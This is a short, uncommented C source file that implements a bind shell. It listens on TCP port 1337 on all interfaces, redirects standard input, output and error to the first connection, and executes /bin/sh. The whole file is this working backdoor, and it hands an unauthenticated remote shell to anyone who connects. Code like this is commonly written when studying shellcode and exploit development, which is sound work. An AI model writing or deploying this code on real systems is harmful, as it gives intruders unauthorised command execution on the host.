#include <sys/socket.h>
#include <sys/types.h>         
#include <stdio.h>
#include <netinet/in.h>



int main() {
  int sockfd = socket(2,1,0);
  
  struct sockaddr_in st;
  st.sin_family = 2;
  st.sin_port = htons(1337);


  inet_aton("0.0.0.0", &st.sin_addr.s_addr);
  int r = bind(sockfd, ( struct sockaddr *) &st, sizeof(st));

  listen(sockfd, 0);
  int fd = accept(sockfd, NULL, NULL);
  
  int i;
  for(i=0; i<=2;i++) {
   dup2(fd, i);
  }

  execve("/bin/sh", NULL ,NULL); 
  return 0;
}

